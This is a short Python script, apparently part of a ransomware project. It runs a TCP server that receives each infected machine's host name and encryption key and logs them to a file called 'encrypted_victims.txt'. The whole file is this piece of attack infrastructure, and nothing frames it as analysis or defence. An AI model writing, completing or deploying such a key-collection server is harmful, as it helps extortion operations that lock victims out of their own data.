import socket

ip_address = 'localhost'
port = 83

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((ip_address, port))
    s.listen(1)
    conn, addr = s.accept()
    print(f'New connection from {addr}')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode('utf-8')
            with open('encrypted_victims.txt', 'a') as f:
                f.write(host_and_key+'\n')
            break
        print('connection completed and closed')